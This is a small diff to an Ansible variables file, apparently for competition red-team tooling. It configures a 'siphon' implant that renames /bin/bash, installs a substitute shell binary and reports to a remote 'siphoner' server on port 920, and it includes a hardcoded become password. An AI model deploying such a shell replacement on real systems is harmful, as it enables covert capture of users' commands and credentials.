@@ -14,7 +14,7 @@ ansible_become_pass: ccdc
 siphon_file_old_path: "/bin/bash"
 siphon_file_new_path: "/bin/ash"
 siphon_path: "/bin/siphon0"
-siphon_logfile_path: "/output"
+siphon_logfile_path: "~/output_$TIMESTAMP" #TIMESTAMP is current system time in Y-M-D_H-M-S
 siphon_server_ip: "{{ hostvars['siphoner_server']['ansible_host'] }}"
 siphon_server_port: "920"
 
